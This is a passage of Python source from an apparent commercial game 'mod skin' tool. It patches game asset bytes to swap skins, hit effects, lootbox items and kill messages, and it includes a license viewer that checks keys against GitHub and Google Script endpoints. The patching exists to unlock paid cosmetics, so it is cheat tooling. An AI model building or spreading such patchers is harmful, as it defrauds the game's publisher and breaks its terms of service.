            if digit_len_diff <= 1:
                if len(lh1) == len(lh2):
                    swaps = [(lh1, lh2), (lh2, lh1)]
                elif len(lh1) > len(lh2):
                    swaps = [(lh1, pad_pattern(lh2, len(lh1))), (lh2, truncate_pattern(lh1, len(lh2)))]
                else:
                    swaps = [(lh2, pad_pattern(lh1, len(lh2))), (lh1, truncate_pattern(lh2, len(lh1)))]
            else:
                if len(a1) < len(a2):
                    shorter_lh, longer_lh = lh1, lh2
                else:
                    shorter_lh, longer_lh = lh2, lh1
                
                src = longer_lh
                dst = shorter_lh
                if len(dst) < len(src):
                    dst = pad_pattern(dst, len(src))
                elif len(dst) > len(src):
                    dst = truncate_pattern(dst, len(src))
                swaps = [(src, dst)]
            
            longhex_map[(id1, id2)] = swaps
    
    if not longhex_map:
        console.print("[yellow]⚠ No longhex pairs could be found.[/]")
        return False
    
    patterns = [re.compile(rb"(?<![0-9])" + re.escape(src) + rb"(?![0-9])") for swaps in longhex_map.values() for src, dst in swaps]
    
    valid_files = [p for p in all_files if any(pat.search(cache[p]) for pat in patterns)]
    
    if not valid_files:
        console.print("[yellow]⚠ No files contain the specified patterns.[/]")
        return False
    
    clean_modified(edited_dir)
    
    for src in valid_files:
        dst = edited_dir / src.name
        shutil.copy2(src, dst)
    
    changelog = {pair: [] for pair in longhex_map}
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
        task = progress.add_task("[cyan]Processing files...", total=len(valid_files))
        
        for src in sorted(valid_files):
            filename = src.name
            progress.update(task, advance=1, description=f"[cyan]Processing {filename}[/]")
            
            edited_path = edited_dir / filename
            orig = edited_path.read_bytes()
            new = bytearray(orig)
            
            for pair, swaps in longhex_map.items():
                for src_pat, dst_pat in swaps:
                    rx = re.compile(rb"(?<![0-9])" + re.escape(src_pat) + rb"(?![0-9])")
                    matches = list(rx.finditer(orig))
                    if matches:
                        for match in reversed(matches):
                            start, end = match.span()
                            new[start:end] = dst_pat
                        ops.append((src_pat.hex(), dst_pat.hex(), len(matches)))
                
                if ops:
                    changelog[pair].append((filename, ops))
            
            if new != orig:
                edited_path.write_bytes(new)
            
            time.sleep(0.02)
    
    with open(changelog_path, 'w', encoding='utf-8') as f:
        f.write(f"ZSDIC Mod Skin Changelog - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 60 + "\n\n")
        
        for (from_id, to_id), entries in changelog.items():
            if entries:
                f.write(f"ID Pair: {from_id} -> {to_id}\n")
                f.write("-" * 40 + "\n")
                
                for filename, ops in entries:
                    f.write(f"File: {filename}\n")
                    for from_hex, to_hex, count in ops:
                        f.write(f"  {from_hex} -> {to_hex} (×{count})\n")
                    f.write("\n")
                f.write("\n")
    
    console.print(Panel("[bold magenta]📝 Mod Skin Complete[/]", expand=False, border_style="magenta"))
    return True

# ==================== SKIN TOOL HIT EFFECT FUNCTIONS ====================

def skin_run_hit_effect_lootbox_mod(pairs, null_count=None):
    console.print(Panel("[bold]🎯 Hit Effect & Lootbox Modification[/bold]"))
    
    if null_count is None:
        null_count_input = Prompt.ask("[cyan]Enter null count for Hit Effect & Lootbox modding", default="100")
        try:
            null_count = int(null_count_input)
        except ValueError:
            null_count = 100
    
    console.print(f"[green]Using null count: {null_count}[/green]")
    
    hit_org_dir = SKIN_TOOL_DIR / "HIT_EFFECT" / "org"
    hit_mod_dir = SKIN_TOOL_DIR / "HIT_EFFECT" / "modified"
    loot_org_dir = SKIN_TOOL_DIR / "LOOTCRATES" / "org"
    loot_mod_dir = SKIN_TOOL_DIR / "LOOTCRATES" / "modified"
    
    clean_modified(hit_mod_dir)
    clean_modified(loot_mod_dir)
    
    if not os.path.exists(HIT_TXT_PATH):
        console.print(f"[red]ERROR: hit.txt missing at: {HIT_TXT_PATH}[/red]")
        return False
    
    entries = []
    id_to_entry = {}
    hex_to_entry = {}
    by_name = defaultdict(dict)
    
    with open(HIT_TXT_PATH, encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            parts = line.strip().split(" | ")
            if len(parts) < 3: 
                continue
            idv, hx_raw, name_raw = parts[0].strip(), parts[1].strip(), parts[2].strip()
            hx = norm_hex(hx_raw)
            if not hx: 
                continue
            name_l = name_raw.lower()
            lvl = extract_level(name_l)
            base = strip_level(name_l)
            e = {"id": idv, "hex": hx, "name": name_raw, "base": base, "level": lvl}
            entries.append(e)
            if idv: 
                id_to_entry[idv] = e
            hex_to_entry[hx] = e
            by_name[base][lvl if lvl is not None else 0] = hx
    
    console.print(f"[green]Loaded {len(entries)} entries from hit.txt[/green]")
    
    def resolve_hit_second(token: str):
        token = token.strip()
        if token in id_to_entry:
            e = id_to_entry[token]
            base = e["base"]
            if 5 in by_name.get(base, {}): 
                return by_name[base][5]
            return e["hex"]
        t = norm_hex(token)
        if t in hex_to_entry:
            e = hex_to_entry[t]
            base = e["base"]
            if 5 in by_name.get(base, {}): 
                return by_name[base][5]
            return t
        return t
    
    def resolve_loot_second(token: str):
        token = token.strip()
        if token in id_to_entry:
            e = id_to_entry[token]
            base = e["base"]
            lvlmap = by_name.get(base, {})
            if lvlmap:
                maxlvl = max(k for k in lvlmap.keys() if isinstance(k, int))
                return lvlmap[maxlvl]
            return e["hex"]
        t = norm_hex(token)
        if t in hex_to_entry:
            e = hex_to_entry[t]
            base = e["base"]
            lvlmap = by_name.get(base, {})
            if lvlmap:
                maxlvl = max(k for k in lvlmap.keys() if isinstance(k, int))
                return lvlmap[maxlvl]
            return t
        return t
    
    pairs_hit = []
    pairs_loot = []
    protected = set()
    
    for a_raw, b_raw in pairs:
        first_hex = None
        if a_raw in id_to_entry:
            first_hex = id_to_entry[a_raw]["hex"]
        elif looks_like_explicit_hex(a_raw):
            nh = norm_hex(a_raw)
            if valid_hex(nh):
                first_hex = nh
        hit_second = resolve_hit_second(b_raw)
        loot_second = resolve_loot_second(b_raw)
        if first_hex and valid_hex(hit_second):
            pairs_hit.append((first_hex, hit_second))
            protected.add(first_hex)
            protected.add(hit_second)
        if first_hex and valid_hex(loot_second):
            pairs_loot.append((first_hex, loot_second))
            protected.add(loot_second)
    
    console.print(f"[cyan]Hit effect pairs: {len(pairs_hit)}[/cyan]")
    console.print(f"[cyan]Lootcrate pairs: {len(pairs_loot)}[/cyan]")
    
    # Process hit files
    hit_files = gather_files(hit_org_dir)
    modified_hit = []
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]Hit:[/cyan] {task.completed}/{task.total}"), BarColumn(), console=console) as prog:
        task = prog.add_task("hit", total=len(hit_files))
        for fp in hit_files:
            try:
                with open(fp, 'rb') as fh: 
                    data = fh.read()
            except Exception:
                prog.update(task, advance=1)
                continue
            
            orig = data
            changes = []
            for first_hex, second_hex in pairs_hit:
                try:
                    to_b = bytes.fromhex(second_hex)
                    from_raw = bytes.fromhex(first_hex)
                except Exception:
                    continue
                cnt_norm = data.count(to_b)
                cnt_rev = data.count(to_b[::-1])
                if cnt_norm == 0 and cnt_rev == 0:
                    continue
                replacement, note = size_fix_bytes(from_raw, len(to_b))
                if cnt_norm: 
                    data = data.replace(to_b, replacement)
                if cnt_rev: 
                    data = data.replace(to_b[::-1], replacement[::-1])
                changes.append((second_hex, first_hex, cnt_norm, cnt_rev, note))
            
            if data != orig:
                rel = os.path.relpath(fp, hit_org_dir)
                rel = sanitize_rel(rel)
                outp = os.path.join(hit_mod_dir, rel)
                os.makedirs(os.path.dirname(outp), exist_ok=True)
                with open(outp, 'wb') as outfh: 
                    outfh.write(data)
                modified_hit.append((rel, changes))
            prog.update(task, advance=1)
    
    # Process loot files
    loot_files = gather_files(loot_org_dir)
    copied_loot = []
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]Loot scan:[/cyan] {task.completed}/{task.total}"), BarColumn(), console=console) as prog:
        task = prog.add_task("loot_scan", total=len(loot_files))
        for fp in loot_files:
            try:
                with open(fp, 'rb') as fh: 
                    data = fh.read()
            except Exception:
                prog.update(task, advance=1)
                continue
            
            matched = False
            for first_hex, second_hex in pairs_loot:
                try:
                    tb = bytes.fromhex(second_hex)
                except Exception:
                    continue
                if tb in data or tb[::-1] in data:
                    matched = True
                    break
            
            if matched:
                rel = os.path.relpath(fp, loot_org_dir)
                rel = sanitize_rel(rel)
                outp = os.path.join(loot_mod_dir, rel)
                os.makedirs(os.path.dirname(outp), exist_ok=True)
                shutil.copy2(fp, outp)
                copied_loot.append(outp)
            prog.update(task, advance=1)
    
    modified_loot = []
    with Progress(SpinnerColumn(), TextColumn("[cyan]Loot modify:[/cyan] {task.completed}/{task.total}"), BarColumn(), console=console) as prog:
        task = prog.add_task("loot_mod", total=len(copied_loot))
        for outp in copied_loot:
            try:
                with open(outp, 'rb') as fh: 
                    data = fh.read()
            except Exception:
                prog.update(task, advance=1)
                continue
            
            orig = data
            changes = []
            for first_hex, second_hex in pairs_loot:
                try:
                    to_b = bytes.fromhex(second_hex)
                    from_raw = bytes.fromhex(first_hex)
                except Exception:
                    continue
                cnt_norm = data.count(to_b)
                cnt_rev = data.count(to_b[::-1])
                if cnt_norm == 0 and cnt_rev == 0:
                    continue
                replacement, note = size_fix_bytes(from_raw, len(to_b))
                if cnt_norm: 
                    data = data.replace(to_b, replacement)
                if cnt_rev: 
                    data = data.replace(to_b[::-1], replacement[::-1])
                changes.append((second_hex, first_hex, cnt_norm, cnt_rev, note))
            
            if data != orig:
                with open(outp, 'wb') as outfh: 
                    outfh.write(data)
                rel = os.path.relpath(outp, loot_mod_dir)
                rel = sanitize_rel(rel)
                modified_loot.append((rel, changes))
            prog.update(task, advance=1)
    
    console.print(f"[green]✅ Hit Effect & Lootbox modding completed[/green]")
    console.print(f"[cyan]Modified {len(modified_hit)} hit effect files[/cyan]")
    console.print(f"[cyan]Modified {len(modified_loot)} lootbox files[/cyan]")
    
    return True

# ==================== SKIN TOOL KILL MESSAGE FUNCTIONS ====================

def find_match_variant_in_data(ascii_bytes: bytes, data: bytes):
    try:
        p = build_safe_pattern(ascii_bytes)
        m = p.search(data)
        if m:
            return m.start(), m.group(0), "raw_wordbound"
    except re.error:
        pass
    
    idx = data.find(ascii_bytes)
    if idx != -1:
        return idx, ascii_bytes, "raw_any"
    
    return None, None, None

def contains_weapon_string(data: bytes):
    key = b"WeaponAvatarBattleEffect"
    pos, m, var = find_match_variant_in_data(key, data)
    return pos is not None

def skin_run_kill_message_mod(pairs, null_count):
    console.clear()
    console.print(Panel("[bold bright_cyan]🚀 Kill Message Mod Started[/]", expand=False, border_style="cyan"))
    
    game_base_dir = SKIN_TOOL_DIR / "KILLMSG"
    output_dir = game_base_dir / "org"
    edited_dir = game_base_dir / "edited"
    
    if not pairs:
        console.print("[red]✖ No ID pairs provided.[/]")
        time.sleep(1.2)
        return False
    
    if not os.path.isdir(output_dir):
        console.print(f"[red]✖ Output directory not found: {output_dir}[/]")
        time.sleep(1.2)
        return False
    
    all_files = []
    for fn in sorted(os.listdir(output_dir)):
        src_path = os.path.join(output_dir, fn)
        if os.path.isfile(src_path):
            all_files.append(src_path)
    
    console.print(f"[green]✔ Found {len(all_files)} files to consider[/]")
    
    if not all_files:
        time.sleep(1)
        return False
    
    cache = {}
    for p in all_files:
        try:
            with open(p, "rb") as fh:
                cache[p] = fh.read()
        except Exception as e:
            console.print(f"[yellow]⚠ Could not read {p}: {e}[/]")
    
    if not cache:
        console.print("[red]✖ No readable files found to process.[/]")
        time.sleep(1.2)
        return False
    
    weapon_files = [path for path, data in cache.items() if contains_weapon_string(data)]
    
    if not weapon_files:
        console.print("[red]✖ No file contains 'WeaponAvatarBattleEffect'[/]")
        time.sleep(1.5)
        return False
    
    console.print(f"[green]✔ Found {len(weapon_files)} weapon file(s) to modify[/]")
    for wf in weapon_files:
        console.print(f"  - {wf}")
    
    longhex_map = {}
    
    with console.status("[bold green]Building longhex map...[/]"):
        for id1, id2 in pairs:
            a1, a2 = id1.encode(), id2.encode()
            found1 = found2 = False
            pos1 = pos2 = None
            match1 = match2 = None
            file1 = file2 = None
            
            for path, data in cache.items():
                if not found1:
                    p1_pos, p1_match, p1_var = find_match_variant_in_data(a1, data)
                    if p1_pos is not None:
                        found1 = True
                        pos1, match1, file1 = p1_pos, p1_match, path
                
                if not found2:
                    p2_pos, p2_match, p2_var = find_match_variant_in_data(a2, data)
                    if p2_pos is not None:
                        found2 = True
                        pos2, match2, file2 = p2_pos, p2_match, path
                
                if found1 and found2:
                    break
            
            if not (found1 and found2):
                continue
            
            match1_len = len(match1)
            match2_len = len(match2)
            next1 = cache[file1][pos1 + match1_len: pos1 + match1_len + 5]
            next2 = cache[file2][pos2 + match2_len: pos2 + match2_len + 5]
            
            lh1 = match1 + next1
            lh2 = match2 + next2
            
            swaps = []
            if match1_len == match2_len:
                swaps = [(lh1, lh2), (lh2, lh1)]
            else:
                if match1_len < match2_len:
                    padded_match1 = pad_pattern(match1, match2_len)
                    padded_lh1 = padded_match1 + next1
                    swaps = [(lh2, padded_lh1)]
                else:
                    padded_match2 = pad_pattern(match2, match1_len)
                    padded_lh2 = padded_match2 + next2
                    swaps = [(lh1, padded_lh2)]
            
            longhex_map[(id1, id2)] = swaps
    
    if not longhex_map:
        console.print("[red]✖ No usable longhex pairs were built[/]")
        time.sleep(1.2)
        return False
    
    console.print(f"[green]✔ Built longhex map for {len(longhex_map)} pair(s)[/]")
    
    all_src_patterns = []
    for swaps in longhex_map.values():
        for src, dst in swaps:
            all_src_patterns.append(src)
    
    valid_files = []
    for p in weapon_files:
        data = cache[p]
        if any(src in data for src in all_src_patterns):
            valid_files.append(p)
    
    if not valid_files:
        console.print("[yellow]⚠ No weapon-file contains the specified patterns[/]")
        time.sleep(1.0)
        return False
    
    if os.path.isdir(edited_dir):
        shutil.rmtree(edited_dir)
    os.makedirs(edited_dir, exist_ok=True)
    
    console.print(f"[cyan]📋 Copying {len(valid_files)} weapon file(s) → edited[/]")
    
    for src in sorted(valid_files):
        try:
            shutil.copy2(src, edited_dir)
        except Exception as e:
            console.print(f"[yellow]⚠ Could not copy {src}: {e}[/]")
    
    progress = Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))
    
    with Live(progress, refresh_per_second=10) as live:
        task = progress.add_task("[cyan]Processing weapon files...", total=len(valid_files))
        
        for src in sorted(valid_files):
            filename = os.path.basename(src)
            progress.update(task, advance=1, description=f"[cyan]Processing {filename}[/]")
            
            edited_path = os.path.join(edited_dir, filename)
            try:
                orig = open(edited_path, 'rb').read()
            except Exception as e:
                console.print(f"[yellow]⚠ Could not read {edited_path}: {e}[/]")
                continue
            
            new = bytearray(orig)
            
            for pair, swaps in longhex_map.items():
                for src_pat, dst_pat in swaps:
                    start = 0
                    while True:
                        pos = orig.find(src_pat, start)
                        if pos == -1:
                            break
                        new[pos:pos + len(src_pat)] = dst_pat
                        start = pos + len(src_pat)
            
            if new != orig:
                try:
                    with open(edited_path, 'wb') as f:
                        f.write(new)
                except Exception as e:
                    console.print(f"[yellow]⚠ Could not write {edited_path}: {e}[/]")
            
            time.sleep(0.02)
    
    console.print(Panel("[bold magenta]📝 Kill Message Complete[/]", expand=False, border_style="magenta"))
    return True

def skin_run_kill_message_only(null_count=None):
    console.print(Panel("[bold magenta]💀 Kill Message Mode[/]", expand=False))
    
    txt_path = MODSKIN_TXT
    if not txt_path.exists():
        console.print("[red]modskin.txt not found[/red]")
        return False
    
    pairs = parse_id_pairs_skin(txt_path)
    if not pairs:
        console.print("[red]No pairs found in modskin.txt[/red]")
        return False
    
    if null_count is None:
        null_count = Prompt.ask("[cyan]Enter null count for Kill Message[/]", default="10")
        try:
            null_count = int(null_count)
        except ValueError:
            null_count = 10
    
    console.print(f"[green]✔ Using null count: {null_count}[/green]")
    console.print(f"[green]✔ Found {len(pairs)} ID pairs[/green]")
    
    killmsg_game_base_dir = SKIN_TOOL_DIR / "KILLMSG"
    killmsg_output_dir = killmsg_game_base_dir / "org"
    killmsg_edited_dir = killmsg_game_base_dir / "edited"
    
    if not killmsg_output_dir.exists():
        console.print(f"[red]Kill message org directory not found[/red]")
        return False
    
    clean_modified(killmsg_edited_dir)
    
    all_files = []
    weapon_files = []
    
    for fn in killmsg_output_dir.iterdir():
        if fn.is_file():
            all_files.append(str(fn))
            try:
                content = fn.read_bytes()
                if b'WeaponAvatarBattleEffect' in content:
                    weapon_files.append(str(fn))
            except Exception:
                continue
    
    console.print(f"[cyan]Found {len(all_files)} total files[/cyan]")
    console.print(f"[green]Found {len(weapon_files)} weapon files[/green]")
    
    if not weapon_files:
        console.print("[red]No weapon files found[/red]")
        return False
    
    all_files_cache = {p: open(p, 'rb').read() for p in all_files}
    longhex_map = {}
    
    console.print("[cyan]Building longhex map...[/cyan]")
    
    with console.status("[bold green]Building longhex map...[/]"):
        for id1, id2 in pairs:
            a1, a2 = id1.encode(), id2.encode()
            p1, p2 = build_safe_pattern(a1), build_safe_pattern(a2)
            pos1, pos2, d1, d2 = None, None, b"", b""
            
            for data in all_files_cache.values():
                if pos1 is None and (m := p1.search(data)):
                    pos1, d1 = m.start(), data
                if pos2 is None and (m := p2.search(data)):
                    pos2, d2 = m.start(), data
                if pos1 is not None and pos2 is not None:
                    break
            
            if pos1 is None or pos2 is None:
                continue
            
            lh1 = a1 + d1[pos1 + len(a1):pos1 + len(a1) + 5]
            lh2 = a2 + d2[pos2 + len(a2):pos2 + len(a2) + 5]
            
            digit_len_diff = abs(len(a1) - len(a2))
            if digit_len_diff <= 1:
                if len(lh1) == len(lh2):
                    swaps = [(lh1, lh2), (lh2, lh1)]
                elif len(lh1) > len(lh2):
                    swaps = [(lh1, pad_pattern(lh2, len(lh1))), (lh2, truncate_pattern(lh1, len(lh2)))]
                else:
                    swaps = [(lh2, pad_pattern(lh1, len(lh2))), (lh1, truncate_pattern(lh2, len(lh1)))]
            else:
                if len(a1) < len(a2):
                    shorter_lh, longer_lh = lh1, lh2
                else:
                    shorter_lh, longer_lh = lh2, lh1
                
                src = longer_lh
                dst = shorter_lh
                if len(dst) < len(src):
                    dst = pad_pattern(dst, len(src))
                elif len(dst) > len(src):
                    dst = truncate_pattern(dst, len(src))
                swaps = [(src, dst)]
            
            longhex_map[(id1, id2)] = swaps
    
    if not longhex_map:
        console.print("[yellow]No longhex pairs found[/yellow]")
        return False
    
    patterns = [re.compile(rb"(?<![0-9])" + re.escape(src) + rb"(?![0-9])") for swaps in longhex_map.values() for src, dst in swaps]
    
    weapon_files_cache = {p: all_files_cache[p] for p in weapon_files}
    valid_weapon_files = []
    
    for path in weapon_files:
        data = weapon_files_cache[path]
        if any(p.search(data) for p in patterns):
            valid_weapon_files.append(path)
    
    if not valid_weapon_files:
        console.print("[yellow]No weapon files contain patterns[/yellow]")
        return False
    
    for src in valid_weapon_files:
        filename = os.path.basename(src)
        dst = killmsg_edited_dir / filename
        shutil.copy2(src, dst)
    
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
        task = progress.add_task("[cyan]Processing weapon files...", total=len(valid_weapon_files))
        
        for src in sorted(valid_weapon_files):
            filename = os.path.basename(src)
            progress.update(task, advance=1, description=f"[cyan]Processing {filename}[/]")
            
            edited_path = killmsg_edited_dir / filename
            orig = edited_path.read_bytes()
            new = bytearray(orig)
            
            for pair, swaps in longhex_map.items():
                for src_pat, dst_pat in swaps:
                    rx = re.compile(rb"(?<![0-9])" + re.escape(src_pat) + rb"(?![0-9])")
                    matches = list(rx.finditer(orig))
                    if matches:
                        for match in reversed(matches):
                            start, end = match.span()
                            new[start:end] = dst_pat
            
            if new != orig:
                edited_path.write_bytes(new)
            
            time.sleep(0.02)
    
    console.print("[cyan]Applying size fixing...[/cyan]")
    pak_tool = PAKToolSkin(SKIN_TOOL_DIR / "SKIN_FOLDER")
    for src in valid_weapon_files:
        filename = os.path.basename(src)
        edited_path = killmsg_edited_dir / filename
        if edited_path.exists():
            pak_tool.apply_size_fix_to_file(str(edited_path), null_count)
    
    console.print(f"[green]✅ Kill Message processing completed[/green]")
    return True

# ==================== LICENSE VIEWER (OPTION 19) ====================

def get_license_info_for_key(license_key: str):
    """Get license information for a specific key from both sources"""
    GOOGLE_SCRIPT_API = "https://script.google.com/macros/s/AKfycbw2qqi_Uj2PIaKfyMKuqvOR6rjMNwYuAjN7O7RjgkwOv7izeCfhRIIwXcrB4SShrcDR/exec"
    GITHUB_KEYS_URL = "https://raw.githubusercontent.com/toxic20021399/tool-key/refs/heads/main/key.json"
    
    hwid = get_hwid()
    telegram_user = get_telegram_username() or "NOT_SET"
    
    license_info = {
        "hwid": hwid,
        "telegram_user": telegram_user,
        "key": license_key,
        "sources": {},
        "is_valid": False,
        "expiry": None,
        "status_message": "",
        "device_authorized": False,
        "hwid_match": False,
        "key_details": {}
    }
    
    # ── Check GitHub ──────────────────────────────────────────────
    try:
        github_response = requests.get(GITHUB_KEYS_URL, timeout=10)
        if github_response.status_code == 200:
            github_data = github_response.json()
            license_info["sources"]["github"] = {
                "status": "available",
                "keys_count": len(github_data.get("keys", {}))
            }
            
            # Check if key exists in GitHub
            if "keys" in github_data and license_key in github_data["keys"]:
                key_data = github_data["keys"][license_key]
                license_info["key_details"]["github"] = key_data
                
                # Check status
                if key_data.get("status") == "active":
                    # Check expiry
                    expiry_date = key_data.get("expiry")
                    if expiry_date:
                        try:
                            exp = datetime.strptime(expiry_date, "%Y-%m-%d")
                            if exp >= datetime.now():
                                license_info["is_valid"] = True
                                license_info["expiry"] = expiry_date
                                license_info["status_message"] = "✅ ACTIVE"
                            else:
                                license_info["status_message"] = "❌ EXPIRED"
                                license_info["expiry"] = expiry_date
                        except:
                            license_info["expiry"] = expiry_date
                            license_info["status_message"] = "⚠ UNKNOWN"
                    else:
                        license_info["is_valid"] = True
                        license_info["status_message"] = "✅ ACTIVE (No Expiry)"
                    
                    # Check HWID
                    stored_hwid = key_data.get("hwid")
                    if stored_hwid:
                        if stored_hwid == hwid:
                            license_info["hwid_match"] = True
                            license_info["device_authorized"] = True
                        else:
                            license_info["hwid_match"] = False
                            license_info["device_authorized"] = False
                            license_info["status_message"] = "❌ HWID MISMATCH"
                    else:
                        # No HWID set - first time activation
                        license_info["hwid_match"] = None
                        license_info["device_authorized"] = None
                else:
                    license_info["status_message"] = f"❌ {key_data.get('status', 'INACTIVE').upper()}"
                    
                license_info["sources"]["github"]["matched"] = True
                license_info["sources"]["github"]["status"] = "active_match"
            else:
                license_info["sources"]["github"]["matched"] = False
                license_info["sources"]["github"]["status"] = "key_not_found"
                
    except Exception as e:
        license_info["sources"]["github"] = {
            "status": "error",
            "error": str(e)
        }
    
    # ── Check Google Script ──────────────────────────────────────
    try:
        response = requests.post(
            GOOGLE_SCRIPT_API,
            data={"license_key": license_key, "action": "check"},
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            license_info["sources"]["google"] = {
                "status": "available",
                "data": data
            }
            
            if data.get("status"):
                license_info["is_valid"] = True
                license_info["expiry"] = data.get("expiry_date")
                license_info["key_details"]["google"] = data
                license_info["sources"]["google"]["matched"] = True
                license_info["sources"]["google"]["status"] = "active_match"
                if not license_info["status_message"] or "✅" not in license_info["status_message"]:
                    license_info["status_message"] = "✅ ACTIVE"
            else:
                license_info["sources"]["google"]["matched"] = False
                license_info["sources"]["google"]["status"] = "key_inactive"
                if not license_info["status_message"]:
                    license_info["status_message"] = "❌ INACTIVE"
    except Exception as e:
        license_info["sources"]["google"] = {
            "status": "error",
            "error": str(e)
        }
    
    # If no source found the key
    if not license_info["is_valid"] and not license_info["status_message"]:
        license_info["status_message"] = "❌ KEY NOT FOUND"
    
    return license_info

def handle_license_viewer():
    """License Viewer - View license information for a specific key"""
    while True:
        show_banner()
        theme = get_theme_colors()
        
        console.print(Panel(
            f'[{theme["title"]}]🔑  LICENSE VIEWER[/]\n'
            f'[{theme["dim"]}]{"─" * 36}[/]\n\n'
            f'[{theme["info"]}]Enter your license key to view its details.[/]\n\n'
            f'[{theme["success"]}][1][/{theme["success"]}] VIEW LICENSE INFO   [{theme["accent"]}]➛ Check license key status[/]\n'
            f'[{theme["success"]}][2][/{theme["success"]}] REFRESH LICENSE     [{theme["accent"]}]➛ Re-verify from server[/]\n\n'
            f'[{theme["error"]}][0][/{theme["error"]}] BACK TO MAIN MENU',
            border_style=theme["panel_border"],
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()
        
        try:
            choice = Prompt.ask(f'[{theme["accent"]}]Select option [/]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "1":
            _show_license_info_with_key()
        elif choice == "2":
            _refresh_license_with_key()
        elif choice == "0":
            break
        else:
            console.print(Panel(
                f'[{theme["error"]}]❌ Option {choice} is invalid[/]',
                border_style=theme["error"],
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

def _get_license_key_from_user():
    """Ask user to enter their license key"""
    theme = get_theme_colors()
    
    console.print()
    console.print(Panel(
        f'[{theme["info"]}]🔑  ENTER YOUR LICENSE KEY[/]\n'
        f'[{theme["dim"]}]{"─" * 32}[/]\n\n'
        f'[{theme["text"]}]Please enter the license key you want to check.[/]\n'
        f'[{theme["dim"]}]The key will be verified against GitHub and Google servers.[/]',
        border_style=theme["panel_border"],
        padding=(1, 2),
        box=box.ROUNDED
    ))
    console.print()
    
    while True:
        key = Prompt.ask(f'[{theme["accent"]}]Enter license key[/]').strip()
        
        # Only check for empty - no length limit
        if not key:
            console.print(f'[{theme["error"]}]❌ License key cannot be empty![/]')
            continue
        
        # Show confirmation with masked key
        if len(key) <= 8:
            confirm = Prompt.ask(f'[{theme["warning"]}]Confirm license key: {key} (y/n)[/]', 
                                choices=['y', 'n'], default='y')
        else:
            confirm = Prompt.ask(f'[{theme["warning"]}]Confirm license key: {key[:4]}...{key[-4:]} (y/n)[/]', 
                                choices=['y', 'n'], default='y')
        
        if confirm == 'y':
            return key

def _show_license_info_with_key():
    """Display license information for a specific key"""
    theme = get_theme_colors()
    
    # Get license key from user
    license_key = _get_license_key_from_user()
    if not license_key:
        return
    
    console.print()
    console.print(Panel(
        f'[{theme["title"]}]🔍 LICENSE INFORMATION[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]',
        border_style=theme["panel_border"],
        padding=(0, 0)
    ))
    console.print()
    
    with Progress(
        SpinnerColumn(spinner_name="dots12", style="bold cyan"),
        TextColumn("[bold cyan]  Fetching license info...[/bold cyan]"),
        console=console,
        transient=True,
    ) as prog:
        prog.add_task("fetch", total=None)
        info = get_license_info_for_key(license_key)
        time.sleep(0.5)
    
    # ── Key display (masked) ──────────────────────────────────────
    key_display = license_key
    if len(key_display) > 20:
        key_display = key_display[:10] + "..." + key_display[-6:]
    
    # ── Build info table ──────────────────────────────────────────
    result_table = Table(
        box=box.ROUNDED,
        border_style=theme["panel_border"],
        padding=(0, 1),
        expand=False
    )
    result_table.add_column("FIELD", style=f"bold {theme['primary']}", width=20)
    result_table.add_column("VALUE", style=theme["text"])
    
    # License Key
    result_table.add_row("🔑 License Key", key_display)
    
    # HWID
    hwid_display = info["hwid"]
    if len(hwid_display) > 32:
        hwid_display = hwid_display[:32] + "..."
    result_table.add_row("🆔 HWID", hwid_display)
    
    # HWID Match Status
    if info["hwid_match"] is True:
        hwid_status = f"[{theme['success']}]✅ Matched[/]"
    elif info["hwid_match"] is False:
        hwid_status = f"[{theme['error']}]❌ Mismatch[/]"
    else:
        hwid_status = f"[{theme['warning']}]⚠ Not Set[/]"
    result_table.add_row("🔗 HWID Match", hwid_status)
    
    # Device Authorization
    if info["device_authorized"] is True:
        dev_status = f"[{theme['success']}]✅ Authorized[/]"
    elif info["device_authorized"] is False:
        dev_status = f"[{theme['error']}]❌ Not Authorized[/]"
    else:
        dev_status = f"[{theme['warning']}]⚠ Pending[/]"
    result_table.add_row("📱 Device Auth", dev_status)
    
    # Telegram User
    result_table.add_row("👤 Telegram", f"@{info['telegram_user']}")
    
    # License Status
    status_color = "green" if info["is_valid"] else "red"
    result_table.add_row("📌 Status", f"[{status_color}]{info['status_message']}[/{status_color}]")
    
    # Expiry
    if info["expiry"]:
        expiry_date = info["expiry"]
        try:
            exp = datetime.strptime(expiry_date, "%Y-%m-%d")
            days_left = (exp - datetime.now()).days
            if days_left >= 0:
                result_table.add_row("📅 Expiry", f"{expiry_date}  [{days_left} days left]")
            else:
                result_table.add_row("📅 Expiry", f"[red]{expiry_date}  [EXPIRED {abs(days_left)} days ago][/red]")
        except:
            result_table.add_row("📅 Expiry", expiry_date)
    else:
        result_table.add_row("📅 Expiry", "[dim]Not set / Lifetime[/dim]")
    
    console.print(Align.center(result_table))
    console.print()
    
    # ── Key Details from Sources ──────────────────────────────────
    if info["key_details"]:
        detail_table = Table(
            title=f"[{theme['title']}]📋 KEY DETAILS[/]",
            box=box.SIMPLE_HEAD,
            border_style=theme["panel_border"],
            header_style=f"bold {theme['primary']}",
            padding=(0, 1),
            expand=False
        )
        detail_table.add_column("SOURCE", style=f"bold {theme['accent']}")
        detail_table.add_column("FIELD", style=f"bold {theme['secondary']}")
        detail_table.add_column("VALUE", style=theme["text"])
        
        for source, data in info["key_details"].items():
            if isinstance(data, dict):
                for field, value in data.items():
                    if field not in ["status", "hwid"]:
                        detail_table.add_row(
                            source.upper() if field == list(data.keys())[0] else "",
                            field,
                            str(value)
                        )
        
        console.print(Align.center(detail_table))
        console.print()
    
    # ── Source Details ────────────────────────────────────────────
    source_table = Table(
        title=f"[{theme['title']}]📡 SOURCE VERIFICATION STATUS[/]",
        box=box.SIMPLE_HEAD,
        border_style=theme["panel_border"],
        header_style=f"bold {theme['primary']}",
        padding=(0, 1),
        expand=False
    )
